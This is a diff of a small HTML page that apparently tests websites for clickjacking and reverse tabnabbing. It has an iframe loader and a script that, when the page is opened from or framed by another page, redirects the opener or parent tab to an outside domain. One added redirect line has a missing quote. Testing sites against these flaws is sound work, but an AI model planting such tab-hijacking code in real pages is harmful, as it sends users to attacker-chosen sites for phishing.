@@ -1,12 +1,35 @@
+<!Doctype HTML>
 <html>
-  <head>
-    <title>Reverse Tabnabbing</title>
-<script>
-if (window.opener) window.opener.parent.location.replace('http://nakanosec.com');
-if (window.parent != window) window.parent.location.replace('http://nakanosec.com');
+    <head>
+        <title>Clickjacking / framing test</title>
+        <script type="text/javascript">
+   function frameIt() {
+   var url = document.getElementById("url").value;
+   var iframe = document.getElementById("iframe");
+
+   iframe.src = url;
+
+} 
+
+document.addEventListener('DOMContentLoaded', function () {
+   document.getElementById('submit-test').addEventListener('click',
+       function() {
+          frameIt();
+       }
+   );
+});
 </script>
+      <script type="text/javascript">
+        if (window.opener) window.opener.parent.location.replace('http://mui.or.id);
+if (window.parent != window) window.parent.location.replace('http://mui.or.id');
+        </script>
     </head>
-  <body>
-    <p1> <center> Testing Tabnabbing</center></p>
-  </body>
-    </html>
+    <body>
+ <center><h1>Click Jacking & Tab Nabbing</h1></center>
+        <p>Enter the URL to frame:</p>
+        <input id="url" type="text" value="http://example.com"></input>
+        <button id="submit-test">Test it!</button>
+        <br />
+        <iframe src="about:blank" id="iframe" width="800px" height="600px"></iframe>
+    </body>
+</html>
